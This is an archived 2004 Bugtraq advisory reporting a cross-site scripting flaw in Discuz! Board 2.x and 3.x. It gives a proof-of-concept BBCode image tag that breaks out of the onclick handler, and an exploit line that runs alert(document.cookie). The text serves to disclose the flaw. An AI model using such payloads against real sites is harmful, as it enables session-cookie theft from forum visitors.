=== Content from marc.info_56b91922_20250124_222419.html ===

```
[[prev in list](?l=bugtraq&m=107604065819233&w=2)] [[next in list](?l=bugtraq&m=107619120230632&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Possible Cross Site Scripting in Discuz! Board
From:       [Cheng Peng Su <apple_soup () msn ! com>](?a=107606741300005&r=1&w=2)
Date:       [2004-02-05 11:38:14](?l=bugtraq&r=1&w=2&b=200402)
Message-ID: [20040205113814.26695.qmail () www ! securityfocus ! com](?i=20040205113814.26695.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=107606726417150&q=mbox) or [body](?l=bugtraq&m=107606726417150&q=raw)]

Advisory Name:Possible Cross Site Scripting in Discuz! Board
Release Date: Feb 5,2004
Application: Discuz! Board
Version Affected: 2.x , 3.x
Platform: PHP
Severity: Low
Discover: Cheng Peng Su(apple_soup_at_msn.com)
Vendor URL: <http://www.discuz.com/>
################################################
Proof Of Concept:
   A thread including:
       [img]<http://a.gif>');(xss code);a=escape('a[/img]
   will be
       <img src="<http://a.gif>');(xss code);a=escape=('a" border="0" \
onload="if(this.width>screen.width*0.7) {this.resized=true; \
this.width=screen.width*0.7; this.alt='Click here to open new window';}" \
onmouseover="if(this.resized) this.style.cursor='hand';" onclick="if(this.resized) \
window.open('<http://site/pic.gif>');(xss code);a=escape('a');">

   So there will be a red 'x' instead of a normal pic,if visitor click the red \
'x',the code will be executed.  I think you know why i add " ;a=escape('a " after the \
xss code.

Exploit:
   [img]<http://a.gif>');alert(document.cookie);a=escape=('a[/img]

[[prev in list](?l=bugtraq&m=107604065819233&w=2)] [[next in list](?l=bugtraq&m=107619120230632&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


